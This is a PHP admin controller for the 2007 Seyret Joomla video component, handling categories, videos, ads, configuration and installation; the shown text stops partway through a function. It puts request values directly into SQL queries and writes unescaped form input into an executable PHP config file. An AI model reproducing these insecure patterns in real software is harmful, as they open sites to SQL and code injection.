<?php
//Seyret Component v.0.2//
/**
* Content code
* @package SEYRET
* @Copyright (C) 2007 Mustafa DINDAR
* @ All rights reserved
* @ seyret Component is Free Software
* @ Released under GNU/GPL License : http://www.gnu.org/copyleft/gpl.html
* @version 0.2
**/	

// no direct access
defined( '_VALID_MOS' ) or die( 'Kýsýtlý alan' );


require_once($mosConfig_absolute_path."/administrator/components/com_seyret/seyret.class.php");
require_once($mosConfig_absolute_path."/administrator/components/com_seyret/seyret.file.php");
require_once( $mainframe->getPath( 'admin_html' ) );



$task = mosGetParam( $_REQUEST, 'task', null);
$id = mosGetParam($_REQUEST,'id',null);

switch ($task) {
//******************************************************	
	case 'intropanel':
	require($mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php');       
	  default:
      intropanel($mosConfig_dbprefix);
      break;	

	case 'freshinstall':
	require($mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php'); 	 
    freshinstall($mosConfig_dbprefix);
    break;		  

	case 'proceeduninstall':
	require($mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php'); 	 
    proceeduninstall($mosConfig_dbprefix, null);
    break;		

	case 'upgradeproceed':
	require($mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php'); 	 
    upgradeproceed($mosConfig_dbprefix);
    break;	
	
	case "uninstall":
		uninstall();
		break;

	case 'upgradeseyret':
		upgradeseyret();
	break;			

	case 'termsofuse':
		termsofuse();
	break;			
		
	case 'iaccepttermsofuse':
		iaccepttermsofuse();
	break;		
		
	case 'idenytermsofuse':
		idenytermsofuse();
	break;		
		
//******************************************************		
		
	case "videocatlist":
		videocatlist($option);
		break;
		
	case "newvideocat":
		editvideocat( 0, $option );
		break;
	
	case "editvideocat":
		editvideocat( $id[0], $option );
		break;
		
	case "savevideocat":
		savevideocat();
		break;
	
	case "cancelvideocat":
		cancelvideocat( $option );
		break;

	case "removevideocat":
		removevideocat( $id, $option );
		break;
		
//******************************************************	
	case 'configuration':
		configuration();
		break;
		
	case 'saveconfig':
		saveconfig();
		break;

	case "diagnostics":
		diagnostics();
		break;


	case "ftpcreatelayerdirs":
		ftpcreatelayerdirs();
		break;
		
		
	case "clearcache":
		clearcache();
		break;		

	case "clearhtmlcache":
		clearhtmlcache();
		break;	
		
//******************************************************	
	case 'videoslist':
		videoslist($option);
		break;	  

	case "newvideo":
		editvideo( 0, $option );
		break;

	case "editvideo":
		editvideo( $id[0], $option );
		break;	  
	  
	case "savevideo":
		savevideo();
		break;
	
	case "cancelvideo":
		cancelvideo( $option );
		break;

	case "removevideo":
		removevideo( $id, $option );
		break;

	case "unpbvideo":
		publishvideo( $id, 0 );
		break;		

	case "pbvideo":
		publishvideo( $id, 1 );
		break;			
		
	case 'joomlaalemtracking':
		joomlaalemtracking($id);
		break;
	  

	 case 'updatejoomlaalemuserid':
		updatejoomlaalemuserid($id);
		break;
	 
	 case 'donation':
		donation();
		break;

	 case 'resetprodonation':
		resetprodonation();
		break;	

	 case 'resetdownloaddonation':
		resetdownloaddonation();
		break;			

	 case 'updateprophp':
		updateprophp();
		break;		
		
		
//****************
	 case 'admanagement':
		admanagement($option);
		break;	

	 case 'newad':
		editad( 0, $option );
		break;	

	 case 'editad':
		editad( $id[0], $option );
		break;			

	case "savead":
		savead();
		break;		

	case "removead":
		removead( $id, $option );
		break;	
//****************		


	 case 'longtailads':
		longtailads();
		break;	
		
	 case 'submitlongtailcode':
		submitlongtailcode();
		break;
		
		
		
		
//****************
	 case 'imageadmanagement':
		imageadmanagement($option);
		break;	

	 case 'newimagead':
		editimagead( 0, $option );
		break;	

	 case 'editimagead':
		editimagead( $id[0], $option );
		break;			

	case "saveimagead":
		saveimagead();
		break;		

	case "removeimagead":
		removeimagead( $id, $option );
		break;	
//****************	

		
	case "extras":
		extras();
		break;
		
	case "saveextras":
		saveextras();
		break;		
		
	case "permissions":
		permissions();
		break;	

	case "newseyretacl":
		editseyretacl( 0, $option );
		break;

		
	case "editseyretacl":
		editseyretacl( $id[0], $option );
		break;		

	case "saveseyretacl":
		saveseyretacl();
		break;
	
	case "removeseyretacl":
		removeseyretacl($id);
		break;	

//ajax
	case "getfilelists":
		getfilelists();
		break;

	case "backupvideo":
		backupvideo($id);
		break;


	case "seyretplugins":
		seyretplugins();
		break;

	case "requestcouponcodetomove";
		requestcouponcodetomove();
		break;
		
//installers...............


	case "packme":
		packme();
		break;			
	 
		
	case "convertvideostoflvbatch";
		convertvideostoflvbatch();
		break;

	case "getpackage";
		getpackage();
		break;		

	case "packit";
		packit();
		break;	

	case "packitprocess";
		packitprocess();
		break;			
	
	case "submitprocoupon";
		submitprocoupon();
		break;	

	case "entersc2";
		entersc2();
		break;			

	case "submitsc2";
		submitsc2();
		break;		
		
		
	case "getdashboard";
		getdashboard();
		break;		

		
}	
	
//Function:IntroPanel->start ***************************
function intropanel($mosConfig_dbprefix) {
		HTML_seyret::intropanel($mosConfig_dbprefix);
}
//Function:IntroPanel->end ***************************



//******************************************************//
//                 FUNCTION GROUP                       //
//                 ==============                       //
//               video Categories                    //
//                                                      //
//                                                      //
//                     Start                            //
//******************************************************//


//Function:videocatlist->start ************************
function videocatlist() {
	
		global $database, $mainframe, $mosConfig_absolute_path;
		
		$limit = $mainframe->getUserStateFromRequest( "viewlistlimit", 'limit', 10 ); //page limits
		$limitstart = $mainframe->getUserStateFromRequest( "view{com_seyret}limitstart", 'limitstart', 0 );

       

	$database->setQuery("SELECT count(*) FROM #__seyret_categories");
	$total = $database->loadResult(); //line count
	echo $database->getErrorMsg();
	if ($limit > $total) 
		{
		$limitstart = 0;
		}


require_once( $mosConfig_absolute_path . '/administrator/includes/pageNavigation.php' );
$pageNav = new mosPageNav( $total, $limitstart, $limit );

$query="SELECT * FROM #__seyret_categories ORDER BY catid ASC LIMIT ".$pageNav->limitstart.", ".$pageNav->limit;
$database->setQuery($query);
$rows = $database->loadObjectList();
if ($database->getErrorNum()) {
echo $database->stderr();
return false;
}



HTML_seyret::htmlvideocatlist($rows, $pageNav);

}

//Function:videocatlist->end ************************


//Function:New/Edit videocat ->start *****************
function editvideocat($id) {
	global $database, $mosConfig_absolute_path, $mosConfig_live_site;

	$row = new mosvideocat( $database );
	$row->load($id);
	
	
	
	$database->setQuery( "SELECT * FROM #__seyret_categories ORDER BY catid ASC");

	$videocat = $database->loadObjectList();
	$videocats = array();
	$videocats[] = mosHTML::makeOption( '',_TOP );
	foreach ($videocat as $videocat) 
	{
	$catid = $videocat->catid;
	$catname = $videocat->categoryname;
	
	$catids="";
	$fordatacatname='';
	$fordatacatnamelast='';
	
	$catidlength=strlen($catid);
	$newcatid=substr($catid,1,$catidlength-3);
	$catid_array=explode('**',$newcatid);


	while ($catidelement=each($catid_array)){
	

	$fordatacatname=$fordatacatname.'**'.$catidelement['value'];
	$fordatacatnamelast=substr($fordatacatname,1,strlen($fordatacatname)).'*#';
	
		$database->setQuery("SELECT n.* FROM #__seyret_categories AS n WHERE catid='$fordatacatnamelast'");
		$cat = $database->loadObjectList();
		foreach ($cat as $cat) {
		$cat_cat = $cat->categoryname;
		}
	$catids=$catids.$cat_cat.' » ';

	}

	$catidlast=substr($catids,0, strlen($catids)-3);
	

	$videocats[] = mosHTML::makeOption( $catid, $catidlast );
	}

	$videocatlist = mosHTML::selectList($videocats,"parentcat",'class="inputbox" size="1"',"value","text",$row->parentcat );
	

	HTML_seyret::htmleditvideocat( $id, $row, $videocatlist);
}
//Function:New/Edit videocat->end   *******************


//Function:videocat->start ************************
function savevideocat(){
	global $database;
	$row = new mosvideocat($database);

clearhtmlcache();
	
	
$parentcat = mosGetParam($_POST,'parentcat',null);
$parentcatlength=strlen($parentcat);
$cleanparentcat=substr($parentcat,0, $parentcatlength-1);
$id = mosGetParam($_POST,'id',null);

if ($id<>0){
	$database->setQuery("SELECT * FROM #__seyret_categories WHERE id='$id'");
	$oldcatname = $database->loadObjectList();
	foreach ($oldcatname as $oldcatname) {
	$oldcatid=$oldcatname->catid;
	}
}
 


	if (!$row->bind( $_POST )) {
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
		}

	if (!$row->store()) {
	echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
	exit();
	}


	$query = "SELECT * FROM #__seyret_categories WHERE catid = 'dummy'";
		$database->setQuery( $query );
		$database->loadObject($row);
		$bcid=$row->id;
		$cataddress=$row->categoryfilesdirectory;
		
$newcatid = $cleanparentcat.'*'.$bcid.'*'.'#';

$database->setQuery("UPDATE #__seyret_categories SET catid='$newcatid' WHERE id='$bcid'");
	if (!$database->query()){
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
	} 
	
if ($id==0 OR $cataddress==""){	
	createcategorydirectory($newcatid);	
	}
	

mosRedirect( "index2.php?option=com_seyret&task=videocatlist");
}
//Function:videocat->end ************************



//Function:ShowCategoryPath->start ************************
function ShowCategoryPath($catid) {
	global $database,$mosConfig_lang;

$fordatacatname="";
	
	
if (strlen($catid)==0){
return '-';
}
else
{
	$catids="";
	$catidlength=strlen($catid);
	$newcatid=substr($catid,1,$catidlength-3);
	$catid_array=explode('**',$newcatid);

	while ($catidelement=each($catid_array)){

	$fordatacatname=$fordatacatname.'**'.$catidelement['value'];
	$fordatacatnamelast=substr($fordatacatname,1,strlen($fordatacatname)).'*#';
	
		$database->setQuery("SELECT n.* FROM #__seyret_categories AS n WHERE catid='$fordatacatnamelast'");
		$cat = $database->loadObjectList();
		foreach ($cat as $cat) {
		$cat_cat = $cat->categoryname;
		}
	$catids=$catids.$cat_cat.' » ';

	}

$catidlast=substr($catids,0, strlen($catids)-3);
	
return $catidlast;
}


}
//Function:ShowCategoryPath->end ************************



//Function:cancelvideocat->start ************************
function cancelvideocat(){
	global $database;
	$row=new mosvideocat($database);
	$row->bind($_POST);
	$row->checkin();
	
mosRedirect( "index2.php?option=com_seyret&task=videocatlist");
}
//Function:cancelvideocat->end ************************


//Function:removevideocat->start ************************
function removevideocat($id){
	global $database;

	if (!is_array( $id ) || count( $id ) < 1) {
		echo "<script> alert('Select an item to delete'); window.history.go(-1);</script>\n";
		exit;
	}
	if (count( $id )) {
		$ids = implode( ',', $id );
		$query = "DELETE FROM #__seyret_categories"
		. "\n WHERE id IN ( $ids )"
		;
		$database->setQuery( $query );
		if (!$database->query()) {
			echo "<script> alert('".$database->getErrorMsg()."'); window.history.go(-1); </script>\n";
		}
	}

mosRedirect( "index2.php?option=com_seyret&task=videocatlist");
}
//Function:removevideocat->end ************************


//Function:Configuration->start ************************
function configuration() {
	HTML_seyret::htmlconfiguration();
}

//Function:Configuration->end ************************

//Function:SaveConfig->start ************************
function saveconfig() {
	global $database, $mosConfig_absolute_path;
		$database->setQuery("SELECT * FROM #__seyret_check"); 		
		$check = $database->loadObjectList();
		foreach ($check as $check) 
		{
			$seyretprocheck=$check->seyretpro;		
		}
		
	clearhtmlcache();
	
	$youtubedeveloperid=mosGetParam( $_POST, 'youtubedeveloperid', null );
	$videolisttitlelettercount=mosGetParam( $_POST, 'videolisttitlelettercount', null );	
	$videolistdescriptionlettercount=mosGetParam( $_POST, 'videolistdescriptionlettercount', null );
	$videowidth=mosGetParam( $_POST, 'videowidth', null );
	$videoheight=mosGetParam( $_POST, 'videoheight', null );	
	$popupvideowidth=mosGetParam( $_POST, 'popupvideowidth', null );
	$popupvideoheight=mosGetParam( $_POST, 'popupvideoheight', null );	
	$orderingkey=mosGetParam( $_POST, 'orderingkey', null );
	$orderingtype=mosGetParam( $_POST, 'orderingtype', null );
	$theme=mosGetParam( $_POST, 'theme', null );
	$enabledownloads=mosGetParam( $_POST, 'enabledownloads', null );
	$oldmessagefeed=mosGetParam( $_POST, 'oldmessagefeed', null );
	$messagefeed=mosGetParam( $_POST, 'messagefeed', null );
	$videocountinvideolist=mosGetParam( $_POST, 'videocountinvideolist', null );
	$videomaxuploadsize=mosGetParam( $_POST, 'videomaxuploadsize', null );
	$thumbmaxuploadsize=mosGetParam( $_POST, 'thumbmaxuploadsize', null );
	$configthumbwidth=mosGetParam( $_POST, 'configthumbwidth', null );
	$embedboxwidth=mosGetParam( $_POST, 'embedboxwidth', null );
	$screenname=mosGetParam( $_POST, 'screenname', null );
	$remoteservervideosupport=mosGetParam( $_POST, 'remoteservervideosupport', null );
	$remoteserver_ads_directory=mosGetParam( $_POST, 'remoteserver_ads_directory', null );
	$remoteserver_videos_directory=mosGetParam( $_POST, 'remoteserver_videos_directory', null );
	$responseseyretcheckitstring=mosGetParam( $_POST, 'responseseyretcheckitstring', null );
	$useajaxbrowsing=mosGetParam( $_POST, 'useajaxbrowsing', null );
	$usemulticolumnsvideolisting=mosGetParam( $_POST, 'usemulticolumnsvideolisting', null );
	$multicolumncount=mosGetParam( $_POST, 'multicolumncount', null );	
	$accesslevelupgradelink=mosGetParam( $_POST, 'accesslevelupgradelink', null );		
	$videoaccesslevelsconf=mosGetParam( $_POST, 'videoaccesslevelsconf', null );
	$localfilesdirectory=mosGetParam( $_POST, 'localfilesdirectory', null );
	$useimageadsystem=mosGetParam( $_POST, 'useimageadsystem', null );
	$imageadduration=mosGetParam( $_POST, 'imageadduration', null );
	$defaultimagead=mosGetParam( $_POST, 'defaultimagead', null );
	$usevideoadsystem=mosGetParam( $_POST, 'usevideoadsystem', null );
	$showthumbwidth=mosGetParam( $_POST, 'showthumbwidth', null );	
	$commentingsystem=mosGetParam( $_POST, 'commentingsystem', null );		
	$showvideotooltips=mosGetParam( $_POST, 'showvideotooltips', null );	
	$showcategorytooltips=mosGetParam( $_POST, 'showcategorytooltips', null );		
	$fbdiscusscategoryforseyret=mosGetParam( $_POST, 'fbdiscusscategoryforseyret', null );
	$leavevideolinkfordiscuss=mosGetParam( $_POST, 'leavevideolinkfordiscuss', null );
	$local_ads_directory=mosGetParam( $_POST, 'local_ads_directory', null );	
	$disablepro=mosGetParam( $_POST, 'disablepro', null );
	$ffmpegpath=mosGetParam( $_POST, 'ffmpegpath', null );		
	$enableflvconversion=mosGetParam( $_POST, 'enableflvconversion', null );
	$enablethumbnailextraction=mosGetParam( $_POST, 'enablethumbnailextraction', null );
	$setflvdimensions=mosGetParam( $_POST, 'setflvdimensions', null );
	$audiosamplingfrequency=mosGetParam( $_POST, 'audiosamplingfrequency', null );
	$audiobitrate=mosGetParam( $_POST, 'audiobitrate', null );
	$videoframerate=mosGetParam( $_POST, 'videoframerate', null );
	$videobitrate=mosGetParam( $_POST, 'videobitrate', null );
	$setthumbdimensions=mosGetParam( $_POST, 'setthumbdimensions', null );
	$setthumbdimensionsbig=mosGetParam( $_POST, 'setthumbdimensionsbig', null );
	$instantvideoprocess=mosGetParam( $_POST, 'instantvideoprocess', null );
	$instantthumbprocess=mosGetParam( $_POST, 'instantthumbprocess', null );	
	$usejoomlaeditor=mosGetParam( $_POST, 'usejoomlaeditor', null );		
	$showoriginallink=mosGetParam( $_POST, 'showoriginallink', null );			
	$ffmpegpreexec=mosGetParam( $_POST, 'ffmpegpreexec', null );	
	$ffmpegpreexec=base64_encode($ffmpegpreexec);
	$errorreporting=mosGetParam( $_POST, 'errorreporting', null );
	$forcelamesupport=mosGetParam( $_POST, 'forcelamesupport', null );	
	$playerskin=mosGetParam( $_POST, 'playerskin', null );
	$videoresponsesystem=mosGetParam( $_POST, 'videoresponsesystem', null );
	$integrateaup=mosGetParam( $_POST, 'integrateaup', null );
	$cachecategoryimages=mosGetParam( $_POST, 'cachecategoryimages', null );
	$cachevideoimages=mosGetParam( $_POST, 'cachevideoimages', null );
	$latestvideoslistcolumncount=mosGetParam( $_POST, 'latestvideoslistcolumncount', null );
	$highestratedvideoslistcolumncount=mosGetParam( $_POST, 'highestratedvideoslistcolumncount', null );
	$mostviewedvideoslistcolumncount=mosGetParam( $_POST, 'mostviewedvideoslistcolumncount', null );
	$featuredvideoslistcolumncount=mosGetParam( $_POST, 'featuredvideoslistcolumncount', null );
	
	
	
	
	
	
	
	
	
	if ($oldmessagefeed<>$messagefeed) {
		$database->setQuery("UPDATE #__seyret_check SET joomlaalemtrack='$messagefeed'");
			if (!$database->query()){
				echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
				exit();
			}	
	}

	if ($seyretprocheck<>"1"){
		$useimageadsystem="0";
		$usevideoadsystem="0";
	}

	$configfile = $mosConfig_absolute_path.'/administrator/components/com_seyret/seyret_config.php';
	@chmod ($configfile, 0766);
	if ( !is_writable( $configfile ) ) {
    	mosRedirect( "index2.php?option=com_seyret&task=configuration", _CONFIG_ERR );
	    break;
  	}



	//SET CONFIG TEXT
	$configtxt = "<?php\n";
	$configtxt .= "\$youtubedeveloperid = \"$youtubedeveloperid\";\n";
	$configtxt .= "\$videolisttitlelettercount = \"$videolisttitlelettercount\";\n";
	$configtxt .= "\$videolistdescriptionlettercount = \"$videolistdescriptionlettercount\";\n";
	$configtxt .= "\$videowidth = \"$videowidth\";\n";
	$configtxt .= "\$videoheight = \"$videoheight\";\n";
	$configtxt .= "\$orderingkey = \"$orderingkey\";\n";
	$configtxt .= "\$orderingtype = \"$orderingtype\";\n";
	$configtxt .= "\$popupvideowidth = \"$popupvideowidth\";\n";
	$configtxt .= "\$popupvideoheight = \"$popupvideoheight\";\n";
	$configtxt .= "\$theme = \"$theme\";\n";
	$configtxt .= "\$enabledownloads = \"$enabledownloads\";\n";
	$configtxt .= "\$videocountinvideolist = \"$videocountinvideolist\";\n";
	$configtxt .= "\$videomaxuploadsize = \"$videomaxuploadsize\";\n";
	$configtxt .= "\$thumbmaxuploadsize = \"$thumbmaxuploadsize\";\n";
	$configtxt .= "\$configthumbwidth = \"$configthumbwidth\";\n";	
	$configtxt .= "\$embedboxwidth = \"$embedboxwidth\";\n";		
	$configtxt .= "\$screenname = \"$screenname\";\n";	
	$configtxt .= "\$remoteservervideosupport = \"$remoteservervideosupport\";\n";	
	$configtxt .= "\$remoteserver_ads_directory = \"$remoteserver_ads_directory\";\n";	
	$configtxt .= "\$remoteserver_videos_directory = \"$remoteserver_videos_directory\";\n";	
	$configtxt .= "\$responseseyretcheckitstring = \"$responseseyretcheckitstring\";\n";	
	$configtxt .= "\$useajaxbrowsing = \"$useajaxbrowsing\";\n";
	$configtxt .= "\$usemulticolumnsvideolisting = \"$usemulticolumnsvideolisting\";\n";
	$configtxt .= "\$multicolumncount = \"$multicolumncount\";\n";
	$configtxt .= "\$videoaccesslevelsconf = \"$videoaccesslevelsconf\";\n";	
	$configtxt .= "\$accesslevelupgradelink = \"$accesslevelupgradelink\";\n";
	$configtxt .= "\$localfilesdirectory = \"$localfilesdirectory\";\n";
	$configtxt .= "\$useimageadsystem = \"$useimageadsystem\";\n";
	$configtxt .= "\$imageadduration = \"$imageadduration\";\n";
	$configtxt .= "\$defaultimagead = \"$defaultimagead\";\n";
	$configtxt .= "\$usevideoadsystem = \"$usevideoadsystem\";\n";
	$configtxt .= "\$showthumbwidth = \"$showthumbwidth\";\n";
	$configtxt .= "\$commentingsystem = \"$commentingsystem\";\n";
	$configtxt .= "\$showvideotooltips = \"$showvideotooltips\";\n";
	$configtxt .= "\$showcategorytooltips = \"$showcategorytooltips\";\n";	
	$configtxt .= "\$fbdiscusscategoryforseyret = \"$fbdiscusscategoryforseyret\";\n";	
	$configtxt .= "\$leavevideolinkfordiscuss = \"$leavevideolinkfordiscuss\";\n";
	$configtxt .= "\$local_ads_directory = \"$local_ads_directory\";\n";	
	$configtxt .= "\$disablepro = \"$disablepro\";\n";	
	$configtxt .= "\$ffmpegpath = \"$ffmpegpath\";\n";	
	$configtxt .= "\$enableflvconversion = \"$enableflvconversion\";\n";	
	$configtxt .= "\$enablethumbnailextraction = \"$enablethumbnailextraction\";\n";	
	$configtxt .= "\$setflvdimensions = \"$setflvdimensions\";\n";	
	$configtxt .= "\$audiosamplingfrequency = \"$audiosamplingfrequency\";\n";	
	$configtxt .= "\$audiobitrate = \"$audiobitrate\";\n";
	$configtxt .= "\$videoframerate = \"$videoframerate\";\n";	
	$configtxt .= "\$videobitrate = \"$videobitrate\";\n";	
	$configtxt .= "\$setthumbdimensions = \"$setthumbdimensions\";\n";
	$configtxt .= "\$setthumbdimensionsbig = \"$setthumbdimensionsbig\";\n";
	$configtxt .= "\$instantvideoprocess = \"$instantvideoprocess\";\n";
	$configtxt .= "\$instantthumbprocess = \"$instantthumbprocess\";\n";
	$configtxt .= "\$usejoomlaeditor = \"$usejoomlaeditor\";\n";
	$configtxt .= "\$showoriginallink = \"$showoriginallink\";\n";
	$configtxt .= "\$ffmpegpreexec = \"$ffmpegpreexec\";\n";
	$configtxt .= "\$errorreporting = \"$errorreporting\";\n";
	$configtxt .= "\$forcelamesupport = \"$forcelamesupport\";\n";
	$configtxt .= "\$playerskin = \"$playerskin\";\n";
	$configtxt .= "\$videoresponsesystem = \"$videoresponsesystem\";\n";
	$configtxt .= "\$integrateaup = \"$integrateaup\";\n";
	$configtxt .= "\$cachecategoryimages = \"$cachecategoryimages\";\n";
	$configtxt .= "\$cachevideoimages = \"$cachevideoimages\";\n";	
	
	$configtxt .= "\$latestvideoslistcolumncount = \"$latestvideoslistcolumncount\";\n";	
	$configtxt .= "\$highestratedvideoslistcolumncount = \"$highestratedvideoslistcolumncount\";\n";
	$configtxt .= "\$mostviewedvideoslistcolumncount = \"$mostviewedvideoslistcolumncount\";\n";
	$configtxt .= "\$featuredvideoslistcolumncount = \"$featuredvideoslistcolumncount\";\n";

	
	
	
	$configtxt .= "?>";

	clearhtmlcache();
	
	$database->setQuery("UPDATE #__seyret_check SET savedconfig='$configtxt'");
	if (!$database->query()){
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
	} 
		
	
	
	//WRITE CONFIG
	if ( $fp = fopen( $configfile, "w" ) ) {
		fwrite( $fp, $configtxt );
		fclose ( $fp );
		mosRedirect( "index2.php?option=com_seyret&task=configuration", _CONFIG_OK );
	} else {
		mosRedirect( "index2.php?option=com_seyret&task=configuration", _CONFIG_ERR );
	}


	


	
}

//Function:Saveconfig->end ************************



//Function:videoslist->start ************************
function videoslist() {
global $database, $mainframe, $mosConfig_absolute_path;
		

	$filtervideoservertype = mosGetParam($_POST,'videoservertype',null);
	$filterpublish = mosGetParam($_POST,'published',null);
	$filterfeatured = mosGetParam($_POST,'featured',null);
	$filtercatid = mosGetParam($_POST,'catid',null);

	
	$filterquery="";
	$filtervarray=array();

	if ($filtervideoservertype!="") {
		$filtervarray[]=" videoservertype='".$filtervideoservertype."' ";
	}
		
	if ($filterpublish!="") {
		$filtervarray[]=" published='".$filterpublish."' ";
	}	

	if ($filterfeatured!="") {
		$filtervarray[]=" featured='".$filterfeatured."' ";
	}

	if ($filtercatid!="") {
		if ($filtercatid=="top") $filtercatid="";
		$filtervarray[]=" catid='".$filtercatid."' ";
	}
	
	if (count($filtervarray)>0){
	
		$filterquery="WHERE";
		
		foreach ($filtervarray as $filter){
			$filterquery.=$filter."AND";
		}
	
	$filterquery=substr($filterquery, 0, -3);
	}

	
		
	$limit = $mainframe->getUserStateFromRequest( "viewlistlimit", 'limit', 10 ); //page limits
	$limitstart = $mainframe->getUserStateFromRequest( "view{com_seyret}limitstart", 'limitstart', 0 );

       

	$database->setQuery("SELECT count(*) FROM #__seyret_items");
	$total = $database->loadResult(); //line count
	echo $database->getErrorMsg();
	if ($limit > $total) 
		{
		$limitstart = 0;
		}


require_once( $mosConfig_absolute_path . '/administrator/includes/pageNavigation.php' );
$pageNav = new mosPageNav( $total, $limitstart, $limit );


$database->setQuery( "SELECT * FROM #__seyret_items $filterquery ORDER BY catid ASC LIMIT $pageNav->limitstart, $pageNav->limit" );

$rows = $database->loadObjectList();
if ($database->getErrorNum()) {
echo $database->stderr();
return false;
}



HTML_seyret::htmlvideoslist($rows, $pageNav);

}

//Function:videoslist->end ************************





//Function:New/Edit video ->start *****************
function editvideo($id) {
	global $database, $mosConfig_absolute_path, $mosConfig_live_site;
	
	
	$row = new mosseyretitem( $database );
	$row->load($id);
	
	

	
	$database->setQuery( "SELECT * FROM #__seyret_categories ORDER BY catid ASC");

	$videocat = $database->loadObjectList();
	$videocats = array();
	$videocats[] = mosHTML::makeOption( '', _TOP );
	foreach ($videocat as $videocat) 
	{
	$catid = $videocat->catid;
	$catname = $videocat->categoryname;
	
	$catids="";
	$fordatacatname='';
	$fordatacatnamelast='';
	
	$catidlength=strlen($catid);
	$newcatid=substr($catid,1,$catidlength-3);
	$catid_array=explode('**',$newcatid);


	while ($catidelement=each($catid_array)){
	

	$fordatacatname=$fordatacatname.'**'.$catidelement['value'];
	$fordatacatnamelast=substr($fordatacatname,1,strlen($fordatacatname)).'*#';
	
		$database->setQuery("SELECT n.* FROM #__seyret_categories AS n WHERE catid='$fordatacatnamelast'");
		$cat = $database->loadObjectList();
		foreach ($cat as $cat) {
		$cat_cat = $cat->categoryname;
		}
	$catids=$catids.$cat_cat.' » ';

	}

	$catidlast=substr($catids,0, strlen($catids)-3);
	

	$videocats[] = mosHTML::makeOption( $catid, $catidlast );
	}

	$videocatlist = mosHTML::selectList($videocats,"catid",'id="catid" class="inputbox" size="1"  onchange="getfilelists()"',"value","text",$row->catid );
	
	$theparentcat=$row->catid;

	HTML_seyret::htmleditvideo( $id, $row, $videocatlist, $theparentcat);
}
//Function:New/Edit video->end   *******************


//Function:video->start ************************
function savevideo(){
	global $database;
	$row = new mosseyretitem($database);

$id = mosGetParam($_POST,'id',null);

clearhtmlcache();


	if (!$row->bind( $_POST )) {
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
		}

	if (!$row->store()) {
	echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
	exit();
	}

mosRedirect( "index2.php?option=com_seyret&task=videoslist");
}
//Function:videocat->end ************************

//Function:cancelvideo->start ************************
function cancelvideo(){
	global $database;
	$row=new mosseyretitem($database);
	$row->bind($_POST);
	$row->checkin();
	
mosRedirect( "index2.php?option=com_seyret&task=videoslist");
}
//Function:cancelvideocat->end ************************


//Function:removevideo->start ************************
function removevideo($id){
	global $database;

	if (!is_array( $id ) || count( $id ) < 1) {
		echo "<script> alert('Select an item to delete'); window.history.go(-1);</script>\n";
		exit;
	}
	if (count( $id )) {
		$ids = implode( ',', $id );
		$query = "DELETE FROM #__seyret_items"
		. "\n WHERE id IN ( $ids )"
		;
		$database->setQuery( $query );
		if (!$database->query()) {
			echo "<script> alert('".$database->getErrorMsg()."'); window.history.go(-1); </script>\n";
		}
	}

mosRedirect( "index2.php?option=com_seyret&task=videoslist");
}
//Function:removevideo->end ************************

//Function:freshinstall->start ***************************
function freshinstall($prefix) {
	global $database, $mosConfig_absolute_path;
	
	$mysqlfile=$mosConfig_absolute_path."/administrator/components/com_seyret/sql/install/freshinstall.sql";

	populate_db( $database, $mysqlfile, $prefix );

//upgrade now...
upgradeproceed($prefix);		
	
	}
//Function:freshinstall->end ***************************

function populate_db( &$database, $sqlfile='seyret.sql', $prefix) {
	global $errors, $database, $mosConfig_absolute_path;
	
		
	$mqr = @get_magic_quotes_runtime();
	@set_magic_quotes_runtime(0);
	$query = fread( fopen( $sqlfile, 'r' ), filesize( $sqlfile ) );
	@set_magic_quotes_runtime($mqr);
	$pieces  = split_sql($query);

	for ($i=0; $i<count($pieces); $i++) {
		$pieces[$i] = trim($pieces[$i]);
		if(!empty($pieces[$i]) && $pieces[$i] != "#") {
			$pieces[$i] = str_replace( "#__", $prefix, $pieces[$i] );
			$database->setQuery( $pieces[$i] );
			if (!$database->query()) {
				$errors[] = array ( $database->getErrorMsg(), $pieces[$i] );
			}
		}
	}
}

function split_sql($sql) {
	$sql = trim($sql);
	$sql = ereg_replace("\n#[^\n]*\n", "\n", $sql);

	$buffer = array();
	$ret = array();
	$in_string = false;

	for($i=0; $i<strlen($sql)-1; $i++) {
		if($sql[$i] == ";" && !$in_string) {
			$ret[] = substr($sql, 0, $i);
			$sql = substr($sql, $i + 1);
			$i = 0;
		}

		if($in_string && ($sql[$i] == $in_string) && $buffer[1] != "\\") {
			$in_string = false;
		}
		elseif(!$in_string && ($sql[$i] == '"' || $sql[$i] == "'") && (!isset($buffer[0]) || $buffer[0] != "\\")) {
			$in_string = $sql[$i];
		}
		if(isset($buffer[1])) {
			$buffer[0] = $buffer[1];
		}
		$buffer[1] = $sql[$i];
	}

	if(!empty($sql)) {
		$ret[] = $sql;
	}
	return($ret);
}


function joomlaalemtracking($id) {
global $database;
		
$database->setQuery("UPDATE #__seyret_check SET joomlaalemtrack='$id'");
	if (!$database->query()){
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
	}

mosRedirect( "index2.php?option=com_seyret");


}

function updatejoomlaalemuserid($id) {
global $database;
$database->setQuery("UPDATE #__seyret_check SET joomlaalemuserid='$id'");
	if (!$database->query()){
		echo "<script> alert('".$row->getError()."'); window.history.go(-1); </script>n";
		exit();
	}

}

		
						
						

function getjhmessage() {
global $database, $mosConfig_live_site,$mosConfig_locale;
		
		
		$database->setQuery("SELECT * FROM #__seyret_check"); 		
		$check = $database->loadObjectList();
		foreach ($check as $check) 
		{
		$dbversion = $check->dbversion;		
		$joomlaalemuserid=$check->joomlaalemuserid;		
		}
		
		if ($joomlaalemuserid=="") {
			$joomlaalemuserid="newuser";
		}
		
			$siteforjoomlaalem=$mosConfig_live_site;
			$siteforjoomlaalem = str_replace( "www.", "", $siteforjoomlaalem );
			$siteforjoomlaalem = str_replace( "https://", "http://", $siteforjoomlaalem );
			
			$dbversionforjoomlaalem=str_replace( ".", "__", $dbversion );
			$sitelanguage=str_replace( ".", "__", $mosConfig_locale );
			$siteforjoomlaalem = str_replace( ".", "__", $siteforjoomlaalem );
